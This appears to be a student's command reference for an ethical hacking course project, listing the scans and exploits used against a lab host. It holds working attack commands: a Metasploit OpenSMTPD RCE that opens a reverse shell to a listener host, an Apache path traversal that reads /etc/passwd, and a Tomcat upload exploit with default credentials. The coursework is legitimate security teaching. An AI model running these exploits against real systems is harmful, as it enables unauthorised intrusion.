# ICT387 Ethical Hacking Command Reference

This file contains all commands used in the final penetration testing report. Each command is prepended with timestamp and student ID for traceability.

---

## 🔹 Environment Setup

```bash
date && echo "StudentID: 34658965" && echo ""
sudo apt update && sudo apt install -y nmap nikto gobuster ftp
```

---

## 🔹 Nmap Scanning

### Full Port Scan
```bash
date && echo "StudentID: 34658965" && echo ""
sudo nmap -Pn -p- 192.168.56.145 -oN all-port-scan.txt
```

### Nmap Vulnerability Script Scan
```bash
date && echo "StudentID: 34658965" && echo ""
nmap -T4 -Pn -p21,22,23,25,80,139,445,8888 -sV --script vuln 192.168.56.145 -oN script-vuln-sV-scan.txt
```

---

## 🔹 Nessus Vulnerability Scan
*Use the GUI to upload scan results and extract key vulnerabilities manually.*
```bash
date && echo "StudentID: 34658965" && echo ""
# Manual step: Review Nessus file 192_168_56_145_45oks7.pdf
```

---

## 🔹 Web Enumeration

### Gobuster Directory Brute-Forcing
```bash
date && echo "StudentID: 34658965" && echo ""
gobuster dir -u http://192.168.56.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

### Nikto Web Misconfiguration Scan
```bash
date && echo "StudentID: 34658965" && echo ""
nikto -h http://192.168.56.145
```

---

## 🔹 Exploitation

### OpenSMTPD RCE - CVE-2020-7247
```bash
date && echo "StudentID: 34658965" && echo ""
msfconsole -q -x 'use exploit/unix/smtp/opensmtpd_mail_from_rce; set RHOSTS 192.168.56.145; set LHOST 192.168.56.142; set LPORT 4444; run'
```

### FTP Anonymous Access
```bash
date && echo "StudentID: 34658965" && echo ""
ftp 192.168.56.145
# Login: anonymous
ls
get fix_logging.txt
```

### Apache RCE Attempt - CVE-2021-41773
```bash
date && echo "StudentID: 34658965" && echo ""
curl -v --path-as-is http://192.168.56.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

### Tomcat Manager Upload Attempt
```bash
date && echo "StudentID: 34658965" && echo ""
msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.145; set RPORT 8080; set HttpUsername tomcat; set HttpPassword tomcat; run'
```

---

## 🔹 Additional Notes

* Always run enumeration first before exploiting.
* Replace IP addresses as needed.
* Maintain logs with timestamps and Student ID in every terminal session.
* Review Nessus/Nmap output files manually for detailed CVE correlation.

---

**Prepared for Academic Submission – ICT387 Ethical Hacking and Software Security Project**
